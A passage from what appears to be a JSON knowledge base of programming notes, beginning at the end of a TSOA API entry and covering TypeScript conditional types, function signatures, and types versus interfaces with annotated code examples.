❌ Don't use 'any' for request/response types\nasync getData(): Promise<any> { }  // Bad\n\n// ❌ Don't skip validation\n@Post()\nasync create(@Body() body: any): Promise<User> { }  // Bad\n\n// ❌ Don't ignore error handling\n@Get('{id}')\nasync get(@Path() id: number): Promise<User> {\n  return await db.findOne(id);  // Can return undefined!\n}\n```\n\n## References\n\n- [TSOA Documentation](https://tsoa-community.github.io/docs/)\n- [TSOA GitHub](https://github.com/lukeautry/tsoa)\n- [OpenAPI Specification](https://swagger.io/specification/)\n\n---\n\n## Summary\n\n**TSOA:** TypeScript framework for type-safe REST APIs with auto-generated OpenAPI docs.\n\n**Key Features:**\n- Decorators for routes: `@Get`, `@Post`, `@Body`, `@Query`\n- Auto-generates: Routes, validation, Swagger spec\n- Type-safe: Request/response types enforced\n\n**Basic Controller:**\n```typescript\n@Route('users')\nexport class UserController extends Controller {\n  @Get('{id}')\n  async getUser(@Path() id: number): Promise<User> { }\n  \n  @Post()\n  async create(@Body() user: CreateUserRequest): Promise<User> { }\n}\n```\n\n**Setup:**\n```bash\nnpm install tsoa express\nnpx tsoa spec-and-routes\n```\n\n**Rule of thumb:** Define types first, add decorators, run `tsoa spec-and-routes`. Types become documentation. Use JSDoc for validation (`@minLength`, `@pattern`). Always set proper status codes. Enable authentication with `@Security`."
    },
    {
      "id": "swe/languages/javascript/typing/conditional-typing",
      "title": "TypeScript Conditional Typing: An Introduction",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "conditional-typing"
      ],
      "content": "# TypeScript Conditional Typing: An Introduction\n\nConditional types in TypeScript allow you to express type relationships and logic based on conditions, making your types more flexible and expressive.\n\n## Key Points\n\n- **Type Logic:** Conditional types use the syntax `T extends U ? X : Y` to choose a type based on a condition.\n- **Distributive:** When used with union types, conditional types distribute over each member.\n- **Type Inference:** You can infer types within conditional types using the `infer` keyword.\n- **Advanced Patterns:** Useful for utility types, API response modeling, and generic libraries.\n\n## Step-by-Step Explanation & Examples\n\n### 1. Basic Conditional Type\n\n```ts\ntype IsString<T> = T extends string ? true : false;\n\ntype A = IsString<\"hello\">; // true\ntype B = IsString<42>; // false\n```\n\n### 2. Distributive Conditional Types\n\n```ts\ntype ToArray<T> = T extends any ? T[] : never;\n\ntype A = ToArray<number | string>; // number[] | string[]\n```\n\n### 3. Using `infer` for Type Extraction\n\n```ts\ntype ElementType<T> = T extends (infer U)[] ? U : T;\n\ntype A = ElementType<string[]>; // string\ntype B = ElementType<number>; // number\n```\n\n### 4. Expanding on `infer`\n\nThe `infer` keyword in TypeScript conditional types allows you to introduce a new type variable to capture and extract part of a type within a conditional type expression. This is especially useful for extracting types from complex structures like arrays, functions, or tuples.\n\n#### Example: Extracting Return Type of a Function\n\n```ts\ntype ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n\ntype A = ReturnType<() => number>; // number\ntype B = ReturnType<(x: string) => any>; // any\ntype C = ReturnType<string>; // never (not a function)\n```\n\n#### Example: Extracting Promise Value Type\n\n```ts\ntype UnwrapPromise<T> = T extends Promise<infer U> ? U : T;\n\ntype A = UnwrapPromise<Promise<string>>; // string\ntype B = UnwrapPromise<number>; // number\n```\n\n#### Example: Extracting Tuple Element Types\n\n```ts\ntype FirstElement<T> = T extends [infer U, ...any[]] ? U : never;\n\ntype A = FirstElement<[boolean, number, string]>; // boolean\ntype B = FirstElement<[]>; // never\n```\n\n**Summary:**\n\n- `infer` lets you \"capture\" a type within a conditional type and use it in the true branch.\n- It's commonly used in utility types to extract or transform types in a flexible way.\n\n**References:**\n\n- [TypeScript Handbook: Conditional Types - infer](https://www.typescriptlang.org/docs/handbook/2/conditional-types.html#infer)\n- [TypeScript Deep Dive: Conditional Types and infer](https://basarat.gitbook.io/typescript/type-system/conditional-types#infer)\n\n## Common Pitfalls\n\n- **Complexity:** Overusing conditional types can make code hard to read and debug.\n- **Unexpected Distribution:** Conditional types distribute over unions by default, which may not always be desired.\n- **Inference Limits:** TypeScript’s inference may not always behave as expected in deeply nested types.\n\n## Practical Applications\n\n- Creating utility types (e.g., `ReturnType<T>`, `NonNullable<T>`)\n- Modeling API responses or data transformations\n- Enforcing type constraints in generic libraries\n\n## References\n\n- [TypeScript Handbook: Conditional Types](https://www.typescriptlang.org/docs/handbook/2/conditional-types.html)\n- [TypeScript Deep Dive: Conditional Types](https://basarat.gitbook.io/typescript/type-system/conditional-types)\n-\n"
    },
    {
      "id": "swe/languages/javascript/typing/function-signature-typing-ts",
      "title": "TypeScript Function Signatures: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "function-signature-typing-ts"
      ],
      "content": "# TypeScript Function Signatures: Complete Overview\n\nA function signature in TypeScript defines the shape of a function—its parameters, their types, and its return type. Function signatures enable type safety by ensuring functions are called with correct arguments and return expected values. Think of a function signature as a contract—it specifies exactly what goes in (parameters) and what comes out (return value), preventing misuse and catching errors at compile time rather than runtime.\n\n## Key Points\n\n- **Basic Syntax:** `function name(param: Type): ReturnType { }`\n- **Arrow Functions:** `const name = (param: Type): ReturnType => { }`\n- **Type Inference:** TypeScript can infer return types (but explicit is clearer)\n- **Optional Parameters:** Use `?` for optional parameters\n- **Generic Functions:** Use `<T>` for flexible, reusable type-safe functions\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Function Signature (Explicit Types)**\n\n   ```typescript\n   // Function declaration\n   function greet(name: string): string {\n     return `Hello, ${name}`;\n   }\n   \n   // Arrow function\n   const greet = (name: string): string => {\n     return `Hello, ${name}`;\n   };\n   \n   // Usage\n   greet('Alice');        // ✅ 'Hello, Alice'\n   greet(123);            // ❌ Error: Argument of type 'number' not assignable\n   const result = greet('Bob'); // result is type 'string'\n   ```\n\n2. **Multiple Parameters with Different Types**\n\n   ```typescript\n   function createUser(\n     name: string,\n     age: number,\n     isActive: boolean\n   ): object {\n     return { name, age, isActive };\n   }\n   \n   // Better: Define return type explicitly\n   function createUser(\n     name: string,\n     age: number,\n     isActive: boolean\n   ): { name: string; age: number; isActive: boolean } {\n     return { name, age, isActive };\n   }\n   \n   const user = createUser('Alice', 25, true);\n   console.log(user.name);  // ✅ TypeScript knows this exists\n   ```\n\n3. **Optional and Default Parameters**\n\n   ```typescript\n   // Optional parameter with ?\n   function greet(name: string, greeting?: string): string {\n     if (greeting) {\n       return `${greeting}, ${name}`;\n     }\n     return `Hello, ${name}`;\n   }\n   \n   greet('Alice');              // ✅ 'Hello, Alice'\n   greet('Bob', 'Hi');          // ✅ 'Hi, Bob'\n   \n   // Default parameter (automatically optional)\n   function multiply(a: number, b: number = 1): number {\n     return a * b;\n   }\n   \n   multiply(5);      // ✅ 5 (uses default b = 1)\n   multiply(5, 3);   // ✅ 15\n   \n   // Optional must come after required\n   function build(name: string, age?: number, city: string) {}  // ❌ Error\n   function build(name: string, city: string, age?: number) {}  // ✅ Correct\n   ```\n\n4. **Rest Parameters (Variable Number of Arguments)**\n\n   ```typescript\n   // Rest parameters are always an array\n   function sum(...numbers: number[]): number {\n     return numbers.reduce((total, n) => total + n, 0);\n   }\n   \n   sum(1, 2, 3);           // ✅ 6\n   sum(10, 20, 30, 40);    // ✅ 100\n   \n   // Rest params with other parameters\n   function logMessage(prefix: string, ...messages: string[]): void {\n     messages.forEach(msg => console.log(`${prefix}: ${msg}`));\n   }\n   \n   logMessage('INFO', 'Server started', 'Port 3000');\n   // INFO: Server started\n   // INFO: Port 3000\n   ```\n\n5. **Function Type Aliases and Interfaces**\n\n   ```typescript\n   // Type alias for function signature\n   type MathOperation = (a: number, b: number) => number;\n   \n   const add: MathOperation = (a, b) => a + b;\n   const subtract: MathOperation = (a, b) => a - b;\n   \n   // Using the type for callbacks\n   function calculate(x: number, y: number, operation: MathOperation): number {\n     return operation(x, y);\n   }\n   \n   calculate(10, 5, add);       // ✅ 15\n   calculate(10, 5, subtract);  // ✅ 5\n   \n   // Interface for function (less common)\n   interface Comparator {\n     (a: string, b: string): number;\n   }\n   \n   const alphabetical: Comparator = (a, b) => a.localeCompare(b);\n   ```\n\n6. **Generic Functions (Type Parameters)**\n\n   ```typescript\n   // Basic generic - works with any type\n   function identity<T>(value: T): T {\n     return value;\n   }\n   \n   identity<string>('hello');  // ✅ Returns string\n   identity<number>(42);       // ✅ Returns number\n   identity('auto');           // ✅ Type inference - T is string\n   \n   // Generic with array\n   function firstElement<T>(arr: T[]): T | undefined {\n     return arr[0];\n   }\n   \n   const first = firstElement([1, 2, 3]);     // number | undefined\n   const firstStr = firstElement(['a', 'b']); // string | undefined\n   \n   // Multiple type parameters\n   function pair<T, U>(first: T, second: U): [T, U] {\n     return [first, second];\n   }\n   \n   pair<string, number>('age', 25);  // ['age', 25]\n   pair('name', true);               // Type inference works\n   ```\n\n7. **Generic Constraints (Restricting Type Parameters)**\n\n   ```typescript\n   // Constrain T to have a length property\n   function logLength<T extends { length: number }>(item: T): void {\n     console.log(item.length);\n   }\n   \n   logLength('hello');      // ✅ 5 (string has length)\n   logLength([1, 2, 3]);    // ✅ 3 (array has length)\n   logLength({ length: 10 }); // ✅ 10\n   logLength(123);          // ❌ Error: number has no length\n   \n   // Constrain to object keys\n   function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n     return obj[key];\n   }\n   \n   const user = { name: 'Alice', age: 25 };\n   getProperty(user, 'name');    // ✅ Returns 'Alice' (type: string)\n   getProperty(user, 'age');     // ✅ Returns 25 (type: number)\n   getProperty(user, 'invalid'); // ❌ Error: 'invalid' not in user\n   ```\n\n8. **Function Overloads (Multiple Signatures)**\n\n   ```typescript\n   // Define multiple signatures\n   function format(value: string): string;\n   function format(value: number): string;\n   function format(value: boolean): string;\n   \n   // Implementation must handle all cases\n   function format(value: string | number | boolean): string {\n     if (typeof value === 'string') {\n       return value.toUpperCase();\n     }\n     if (typeof value === 'number') {\n       return value.toFixed(2);\n     }\n     return value ? 'TRUE' : 'FALSE';\n   }\n   \n   format('hello');  // ✅ 'HELLO'\n   format(42.567);   // ✅ '42.57'\n   format(true);     // ✅ 'TRUE'\n   \n   // Complex overload example\n   function createElement(tag: 'div'): HTMLDivElement;\n   function createElement(tag: 'span'): HTMLSpanElement;\n   function createElement(tag: string): HTMLElement;\n   \n   function createElement(tag: string): HTMLElement {\n     return document.createElement(tag);\n   }\n   \n   const div = createElement('div');   // Type: HTMLDivElement\n   const span = createElement('span'); // Type: HTMLSpanElement\n   ```\n\n9. **Callback Functions with Types**\n\n   ```typescript\n   // Simple callback\n   function fetchData(callback: (data: string) => void): void {\n     setTimeout(() => {\n       callback('Data loaded');\n     }, 1000);\n   }\n   \n   fetchData((data) => {\n     console.log(data); // data is typed as string\n   });\n   \n   // Callback with error handling\n   type Callback<T> = (error: Error | null, result?: T) => void;\n   \n   function readFile(path: string, callback: Callback<string>): void {\n     // Simulate async operation\n     if (path) {\n       callback(null, 'file contents');\n     } else {\n       callback(new Error('Invalid path'));\n     }\n   }\n   \n   readFile('file.txt', (err, data) => {\n     if (err) {\n       console.error(err.message);\n       return;\n     }\n     console.log(data?.toUpperCase()); // data might be undefined\n   });\n   ```\n\n10. **Async Functions and Promises**\n\n    ```typescript\n    // Async function returns Promise<T>\n    async function fetchUser(id: number): Promise<{ name: string; age: number }> {\n      const response = await fetch(`/api/users/${id}`);\n      return response.json();\n    }\n    \n    // Usage\n    fetchUser(1).then(user => {\n      console.log(user.name); // TypeScript knows user shape\n    });\n    \n    // Generic async function\n    async function fetchData<T>(url: string): Promise<T> {\n      const response = await fetch(url);\n      return response.json();\n    }\n    \n    interface User {\n      id: number;\n      name: string;\n    }\n    \n    const user = await fetchData<User>('/api/user/1');\n    console.log(user.name); // ✅ TypeScript knows user is User type\n    \n    // Error handling with async\n    async function safeDelete(id: number): Promise<boolean> {\n      try {\n        await fetch(`/api/delete/${id}`, { method: 'DELETE' });\n        return true;\n      } catch (error) {\n        return false;\n      }\n    }\n    ```\n\n## Common Pitfalls\n\n- Forgetting to specify return type (leads to `any` or incorrect inference)\n- Using `any` type instead of proper types (defeats TypeScript's purpose)\n- Not handling optional parameters correctly (forgetting `undefined` checks)\n- Overusing function overloads when union types would work better\n- Ignoring TypeScript errors and using `@ts-ignore` (hides real issues)\n- Not constraining generics when specific properties are needed\n- Mixing optional and required parameters in wrong order\n\n## Practical Applications\n\n- API client functions (typed request/response)\n- Event handlers with proper event types\n- Array manipulation with generic utilities\n- Form validation with type-safe schemas\n- Database query builders with inferred return types\n- React component prop functions\n\n## References\n\n- [TypeScript Handbook: Functions](https://www.typescriptlang.org/docs/handbook/2/functions.html)\n- [TypeScript Handbook: Generics](https://www.typescriptlang.org/docs/handbook/2/generics.html)\n- [TypeScript Deep Dive: Functions](https://basarat.gitbook.io/typescript/type-system/functions)\n- [TypeScript Playground](https://www.typescriptlang.org/play) - Interactive testing\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Conditional Types in Function Signatures:**\n  ```typescript\n  // Return different types based on input\n  type Response<T> = T extends string ? string[] : number[];\n  \n  function process<T extends string | number>(value: T): Response<T> {\n    if (typeof value === 'string') {\n      return value.split('') as Response<T>;\n    }\n    return [value, value * 2] as Response<T>;\n  }\n  \n  const strResult = process('hello'); // string[]\n  const numResult = process(42);      // number[]\n  ```\n\n- **Utility Types with Functions:**\n  ```typescript\n  // ReturnType - Extract return type\n  function createUser() {\n    return { id: 1, name: 'Alice', age: 25 };\n  }\n  \n  type User = ReturnType<typeof createUser>;\n  // { id: number; name: string; age: number }\n  \n  // Parameters - Extract parameter types\n  function login(email: string, password: string) {}\n  \n  type LoginParams = Parameters<typeof login>;\n  // [string, string]\n  \n  // Use with spread\n  function authenticate(...args: LoginParams) {\n    login(...args);\n  }\n  \n  // Partial - Make all properties optional\n  type UpdateUser = Partial<User>;\n  \n  function updateUser(id: number, updates: UpdateUser): User {\n    // updates can have any combination of User properties\n  }\n  ```\n\n- **Type Guards in Functions:**\n  ```typescript\n  // User-defined type guard\n  function isString(value: unknown): value is string {\n    return typeof value === 'string';\n  }\n  \n  function process(input: string | number) {\n    if (isString(input)) {\n      console.log(input.toUpperCase()); // ✅ TypeScript knows it's string\n    } else {\n      console.log(input.toFixed(2));    // ✅ TypeScript knows it's number\n    }\n  }\n  \n  // Generic type guard\n  function isArray<T>(value: unknown): value is T[] {\n    return Array.isArray(value);\n  }\n  \n  // Discriminated unions with type guards\n  type Success = { status: 'success'; data: string };\n  type Failure = { status: 'error'; error: string };\n  type Result = Success | Failure;\n  \n  function handleResult(result: Result): string {\n    if (result.status === 'success') {\n      return result.data;  // ✅ TypeScript knows it's Success\n    }\n    return result.error;   // ✅ TypeScript knows it's Failure\n  }\n  ```\n\n- **Higher-Order Functions (Functions that Return Functions):**\n  ```typescript\n  // Function that returns a function\n  function createMultiplier(factor: number): (x: number) => number {\n    return (x: number) => x * factor;\n  }\n  \n  const double = createMultiplier(2);\n  const triple = createMultiplier(3);\n  \n  double(5);  // 10\n  triple(5);  // 15\n  \n  // Generic higher-order function\n  function createFormatter<T>(\n    formatter: (value: T) => string\n  ): (values: T[]) => string[] {\n    return (values: T[]) => values.map(formatter);\n  }\n  \n  const formatNumbers = createFormatter<number>(n => n.toFixed(2));\n  formatNumbers([1.234, 5.678]); // ['1.23', '5.68']\n  ```\n\n- **Function Composition with Types:**\n  ```typescript\n  // Compose two functions\n  function compose<A, B, C>(\n    f: (b: B) => C,\n    g: (a: A) => B\n  ): (a: A) => C {\n    return (a: A) => f(g(a));\n  }\n  \n  const addOne = (x: number) => x + 1;\n  const double = (x: number) => x * 2;\n  \n  const addOneThenDouble = compose(double, addOne);\n  addOneThenDouble(5); // 12 (5 + 1 = 6, 6 * 2 = 12)\n  \n  // Pipe (reverse composition)\n  function pipe<A, B, C>(\n    f: (a: A) => B,\n    g: (b: B) => C\n  ): (a: A) => C {\n    return (a: A) => g(f(a));\n  }\n  \n  const doubleThenAddOne = pipe(double, addOne);\n  doubleThenAddOne(5); // 11 (5 * 2 = 10, 10 + 1 = 11)\n  ```\n\n- **Variadic Tuple Types (Advanced Rest Parameters):**\n  ```typescript\n  // Prepend element to tuple\n  function prepend<T, U extends unknown[]>(\n    first: T,\n    ...rest: U\n  ): [T, ...U] {\n    return [first, ...rest];\n  }\n  \n  const result = prepend('hello', 1, true, [1, 2]);\n  // Type: [string, number, boolean, number[]]\n  \n  // Generic function that preserves tuple types\n  function concat<T extends unknown[], U extends unknown[]>(\n    arr1: [...T],\n    arr2: [...U]\n  ): [...T, ...U] {\n    return [...arr1, ...arr2];\n  }\n  \n  const combined = concat(['a', 'b'], [1, 2, 3]);\n  // Type: [string, string, number, number, number]\n  ```\n\n- **This Parameter Typing:**\n  ```typescript\n  // Explicitly type 'this'\n  interface Database {\n    connection: string;\n    query(this: Database, sql: string): void;\n  }\n  \n  const db: Database = {\n    connection: 'postgres://localhost',\n    query(this: Database, sql: string) {\n      console.log(`Executing on ${this.connection}: ${sql}`);\n    }\n  };\n  \n  db.query('SELECT * FROM users'); // ✅ Works\n  \n  const queryFn = db.query;\n  queryFn('SELECT * FROM users');  // ❌ Error: 'this' is undefined\n  \n  // Fix with bind\n  const boundQuery = db.query.bind(db);\n  boundQuery('SELECT * FROM users'); // ✅ Works\n  ```\n\n- **Assertion Functions (Control Flow Analysis):**\n  ```typescript\n  // Assertion function narrows type\n  function assert(condition: unknown, message: string): asserts condition {\n    if (!condition) {\n      throw new Error(message);\n    }\n  }\n  \n  function processValue(value: string | null) {\n    assert(value !== null, 'Value cannot be null');\n    // After assert, TypeScript knows value is string\n    console.log(value.toUpperCase());\n  }\n  \n  // Assert specific type\n  function assertIsString(value: unknown): asserts value is string {\n    if (typeof value !== 'string') {\n      throw new Error('Not a string');\n    }\n  }\n  \n  function process(input: unknown) {\n    assertIsString(input);\n    console.log(input.toUpperCase()); // ✅ TypeScript knows it's string\n  }\n  ```\n\n- **Template Literal Types in Functions:**\n  ```typescript\n  // Type-safe event emitter\n  type EventName = 'user:login' | 'user:logout' | 'order:created';\n  \n  function emit(event: EventName, data: unknown): void {\n    console.log(`Event: ${event}`, data);\n  }\n  \n  emit('user:login', { id: 1 });    // ✅\n  emit('invalid:event', {});        // ❌ Error\n  \n  // Generate types from template\n  type HTTPMethod = 'GET' | 'POST' | 'PUT' | 'DELETE';\n  type Endpoint = `/api/${string}`;\n  \n  function request(method: HTTPMethod, endpoint: Endpoint): void {\n    console.log(`${method} ${endpoint}`);\n  }\n  \n  request('GET', '/api/users');     // ✅\n  request('GET', '/users');         // ❌ Error: must start with /api/\n  ```\n\n- **Best Practices:**\n  ```typescript\n  // ✅ Good: Explicit return type\n  function calculateTotal(items: number[]): number {\n    return items.reduce((sum, n) => sum + n, 0);\n  }\n  \n  // ❌ Bad: Implicit return (harder to catch errors)\n  function calculateTotal(items: number[]) {\n    return items.reduce((sum, n) => sum + n, 0);\n  }\n  \n  // ✅ Good: Narrow types\n  type Status = 'pending' | 'success' | 'error';\n  function setStatus(status: Status): void {}\n  \n  // ❌ Bad: Too broad\n  function setStatus(status: string): void {}\n  \n  // ✅ Good: Use generics for reusability\n  function wrapInArray<T>(value: T): T[] {\n    return [value];\n  }\n  \n  // ❌ Bad: Specific types (less reusable)\n  function wrapStringInArray(value: string): string[] {\n    return [value];\n  }\n  \n  // ✅ Good: Optional parameter last\n  function createUser(name: string, age?: number): User {}\n  \n  // ❌ Bad: Optional parameter first\n  function createUser(age?: number, name: string): User {}\n  ```\n\n- **Real-World Example (API Client):**\n  ```typescript\n  interface ApiResponse<T> {\n    data: T;\n    status: number;\n    message: string;\n  }\n  \n  interface User {\n    id: number;\n    name: string;\n    email: string;\n  }\n  \n  async function fetchAPI<T>(\n    endpoint: string,\n    options?: RequestInit\n  ): Promise<ApiResponse<T>> {\n    const response = await fetch(endpoint, options);\n    return response.json();\n  }\n  \n  // Usage with type inference\n  async function getUser(id: number): Promise<User> {\n    const response = await fetchAPI<User>(`/api/users/${id}`);\n    return response.data;\n  }\n  \n  const user = await getUser(1);\n  console.log(user.name); // ✅ TypeScript knows all User properties\n  ```"
    },
    {
      "id": "swe/languages/javascript/typing/interface-vs-typing",
      "title": "TypeScript Types vs Interfaces: Complete Overview",
      "path": [
        "swe",
        "languages",
        "javascript",
        "typing",
        "interface-vs-typing"
      ],
      "content": "# TypeScript Types vs Interfaces: Complete Overview\n\nTypes and interfaces in TypeScript both define the shape of data structures, but they have different origins and capabilities. Interfaces come from object-oriented programming and define contracts for objects and classes, while types are aliases that can represent any TypeScript type including primitives, unions, and complex compositions. Think of interfaces as blueprints for buildings (structured, extendable, formal) and types as mathematical equations (flexible, can represent anything, composable).\n\n## Key Points\n\n- **Interfaces:** Object contracts, extendable, declaration merging, OOP-focused\n- **Types:** Type aliases, highly flexible, can represent unions/intersections\n- **Similarities:** Both define object shapes, both support generics, most features overlap\n- **Differences:** Types handle unions/tuples, interfaces merge declarations\n- **Recommendation:** Know both, choose based on use case and team convention\n\n## High-Level Overview\n\n### What is an Interface?\n\nAn interface defines a contract—a blueprint that describes what properties and methods an object must have. Interfaces are designed for object-oriented programming patterns, focusing on defining the structure of objects and classes.\n\n```typescript\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\n// Contract: Any object of type User MUST have these exact properties\nconst user: User = {\n  id: 1,\n  name: 'Alice',\n  email: 'alice@example.com'\n};\n```\n\n**Core concept:** Interfaces describe *what* an object looks like and can be extended or implemented by other interfaces or classes.\n\n### What is a Type?\n\nA type is an alias—a name given to any TypeScript type. Types can represent primitives, objects, unions, intersections, tuples, or any combination. They're more flexible and can describe complex type compositions.\n\n```typescript\ntype User = {\n  id: number;\n  name: string;\n  email: string;\n};\n\n// Same usage as interface for objects\nconst user: User = {\n  id: 1,\n  name: 'Alice',\n  email: 'alice@example.com'\n};\n\n// But types can also represent other things:\ntype ID = string | number;           // Union\ntype Status = 'pending' | 'done';    // Literal union\ntype Point = [number, number];       // Tuple\n```\n\n**Core concept:** Types create aliases for *any* type expression, not just objects.\n\n## Similarities\n\nBoth interfaces and types share many capabilities and can often be used interchangeably for defining object shapes.\n\n### 1. Defining Object Shapes\n\n```typescript\n// Interface\ninterface Product {\n  id: number;\n  name: string;\n  price: number;\n}\n\n// Type\ntype Product = {\n  id: number;\n  name: string;\n  price: number;\n};\n\n// Usage is identical\nconst laptop: Product = {\n  id: 1,\n  name: 'Laptop',\n  price: 999\n};\n```\n\n### 2. Optional and Readonly Properties\n\n```typescript\n// Interface\ninterface User {\n  id: number;\n  name: string;\n  email?: string;          // Optional\n  readonly createdAt: Date; // Cannot be modified\n}\n\n// Type\ntype User = {\n  id: number;\n  name: string;\n  email?: string;\n  readonly createdAt: Date;\n};\n\n// Both work the same way\n```\n\n### 3. Function Signatures\n\n```typescript\n// Interface\ninterface Calculate {\n  (a: number, b: number): number;\n}\n\n// Type\ntype Calculate = (a: number, b: number) => number;\n\n// Both work\nconst add: Calculate = (a, b) => a + b;\n```\n\n### 4. Generics\n\n```typescript\n// Interface\ninterface Box<T> {\n  value: T;\n}\n\n// Type\ntype Box<T> = {\n  value: T;\n};\n\n// Usage identical\nconst numberBox: Box<number> = { value: 42 };\nconst stringBox: Box<string> = { value: 'hello' };\n```\n\n### 5. Index Signatures\n\n```typescript\n// Interface\ninterface StringDictionary {\n  [key: string]: string;\n}\n\n// Type\ntype StringDictionary = {\n  [key: string]: string;\n};\n\n// Both allow dynamic keys\nconst dict: StringDictionary = {\n  firstName: 'Alice',\n  lastName: 'Smith'\n};\n```\n\n### 6. Extension/Composition\n\n```typescript\n// Interface - extends\ninterface Animal {\n  name: string;\n}\n\ninterface Dog extends Animal {\n  breed: string;\n}\n\n// Type - intersection\ntype Animal = {\n  name: string;\n};\n\ntype Dog = Animal & {\n  breed: string;\n};\n\n// End result is the same\nconst myDog: Dog = {\n  name: 'Buddy',\n  breed: 'Labrador'\n};\n```\n\n## Differences\n\nWhile interfaces and types overlap significantly, they have distinct capabilities that make each better suited for certain scenarios.\n\n### 1. Union Types (Types Only)\n\n```typescript\n// ✅ Type can represent unions\ntype Status = 'pending' | 'loading' | 'success' | 'error';\ntype ID = string | number;\n\ntype Result = \n  | { success: true; data: string }\n  | { success: false; error: string };\n\n// ❌ Interface cannot represent unions\ninterface Status = 'pending' | 'loading';  // Syntax error\ninterface ID = string | number;            // Syntax error\n\n// Why: Interfaces define object contracts, not alternatives\n```\n\n### 2. Primitive Types and Tuples (Types Only)\n\n```typescript\n// ✅ Type can alias primitives\ntype Email = string;\ntype Count = number;\ntype IsActive = boolean;\n\n// ✅ Type can define tuples\ntype Point = [x: number, y: number];\ntype RGB = [red: number, green: number, blue: number];\n\nconst color: RGB = [255, 0, 128];\n\n// ❌ Interface cannot represent primitives or tuples\ninterface Email = string;  // Error\ninterface Point = [number, number];  // Error\n```\n\n### 3. Declaration Merging (Interfaces Only)\n\n```typescript\n// ✅ Interface - can be declared multiple times, merges automatically\ninterface User {\n  name: string;\n}\n\ninterface User {\n  email: string;\n}\n\n// Merged result\nconst user: User = {\n  name: 'Alice',\n  email: 'alice@example.com'  // Both properties required\n};\n\n// ❌ Type - cannot be re-declared\ntype User = {\n  name: string;\n};\n\ntype User = {  // Error: Duplicate identifier 'User'\n  email: string;\n};\n\n// Use case: Augmenting third-party library types\n```\n\n### 4. Computed Properties (Types More Flexible)\n\n```typescript\n// ✅ Type can use computed property names\ntype Keys = 'firstName' | 'lastName';\n\ntype Person = {\n  [K in Keys]: string;\n};\n// Result: { firstName: string; lastName: string; }\n\n// ❌ Interface cannot use computed properties this way\ninterface Person {\n  [K in Keys]: string;  // Error\n}\n\n// Interfaces require literal property names\n```\n\n### 5. Extends vs Intersection Behavior\n\n```typescript\n// Interface extends - strict checking at declaration\ninterface A {\n  prop: string;\n}\n\ninterface B extends A {\n  prop: number;  // ❌ Error: Property 'prop' must be string\n}\n\n// Type intersection - merges, can create impossible types\ntype A = {\n  prop: string;\n};\n\ntype B = A & {\n  prop: number;  // ✅ Compiles but creates impossible type\n};\n\n// prop is now (string & number) = never\nconst b: B = { prop: ??? };  // No valid value\n```\n\n### 6. Utility Types and Mapped Types\n\n```typescript\n// ✅ Types excel at transformation and utilities\ntype Nullable<T> = T | null;\ntype ReadOnly<T> = { readonly [K in keyof T]: T[K] };\ntype PickTwo<T> = Pick<T, 'prop1' | 'prop2'>;\n\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\ntype PartialUser = Partial<User>;\n// { id?: number; name?: string; email?: string; }\n\ntype UserKeys = keyof User;\n// 'id' | 'name' | 'email'\n\n// Interfaces cannot create these transformations directly\n```\n\n### 7. Class Implementation\n\n```typescript\n// Both can be implemented by classes, but interfaces are more idiomatic\n\n// Interface (traditional OOP pattern)\ninterface Repository {\n  save(data: any): void;\n  findById(id: string): any;\n}\n\nclass UserRepository implements Repository {\n  save(data: any) { /* ... */ }\n  findById(id: string) { /* ... */ }\n}\n\n// Type (less common, but works)\ntype Repository = {\n  save(data: any): void;\n  findById(id: string): any;\n};\n\nclass UserRepository implements Repository {\n  save(data: any) { /* ... */ }\n  findById(id: string) { /* ... */ }\n}\n\n// Both work, but interface is convention for class contracts\n```\n\n### 8. Performance (Negligible Difference)\n\n```typescript\n// Interfaces are cached by name (slightly faster compilation)\ninterface User {\n  name: string;\n}\n\n// Types are evaluated structurally each time\ntype User = {\n  name: string;\n};\n\n// In practice: Difference is negligible\n// Choose based on features, not performance\n```\n\n## Common Pitfalls\n\n- Trying to create unions with interfaces (use types instead)\n- Re-declaring types expecting merge behavior (only interfaces merge)\n- Using interfaces for primitives or tuples (not supported)\n- Creating impossible types with intersections (interfaces prevent this)\n- Not leveraging declaration merging for library augmentation\n- Mixing `extends` and `&` inconsistently in a codebase\n\n## Practical Applications\n\n**Use Interfaces for:**\n- React component props (convention)\n- Class definitions and implementations\n- Public APIs that consumers might extend\n- Object shapes in object-oriented patterns\n- Third-party library augmentation\n\n**Use Types for:**\n- Union types and discriminated unions\n- Tuple types and primitives\n- Function type signatures (convention)\n- Utility and helper types\n- Complex type transformations\n- State machines with unions\n\n## References\n\n- [TypeScript Handbook: Types vs Interfaces](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#differences-between-type-aliases-and-interfaces)\n- [TypeScript Deep Dive](https://basarat.gitbook.io/typescript/type-system)\n- [React TypeScript Cheatsheet](https://react-typescript-cheatsheet.netlify.app/)\n\n---\n\n## Greater Detail\n\n### When to Choose Which\n\n```typescript\n// Decision Tree:\n\n// Need union types? → TYPE\ntype Status = 'idle' | 'loading' | 'success' | 'error';\n\n// Need tuple types? → TYPE\ntype Coordinate = [latitude: number, longitude: number];\n\n// Defining React props? → INTERFACE (convention)\ninterface ButtonProps {\n  label: string;\n  onClick: () => void;\n}\n\n// Creating utility types? → TYPE\ntype Nullable<T> = T | null;\ntype ReadonlyDeep<T> = { readonly [K in keyof T]: ReadonlyDeep<T[K]> };\n\n// Class contract/implementation? → INTERFACE (convention)\ninterface DatabaseAdapter {\n  connect(): Promise<void>;\n  disconnect(): Promise<void>;\n}\n\n// Public API for library? → INTERFACE (consumers can extend/merge)\ninterface PluginConfig {\n  name: string;\n  version: string;\n}\n\n// Discriminated unions? → TYPE\ntype ApiResponse<T> =\n  | { success: true; data: T }\n  | { success: false; error: string };\n\n// Function signature? → TYPE (convention)\ntype EventHandler = (event: Event) => void;\n```\n\n### Real-World Example: API Client\n\n```typescript\n// Interfaces for object contracts\ninterface User {\n  id: string;\n  name: string;\n  email: string;\n  role: UserRole;\n}\n\ninterface CreateUserRequest {\n  name: string;\n  email: string;\n  role: UserRole;\n}\n\n// Types for unions and variants\ntype UserRole = 'admin' | 'user' | 'guest';\n\ntype ApiResponse<T> =\n  | { status: 'success'; data: T }\n  | { status: 'error'; error: ApiError };\n\ntype ApiError = 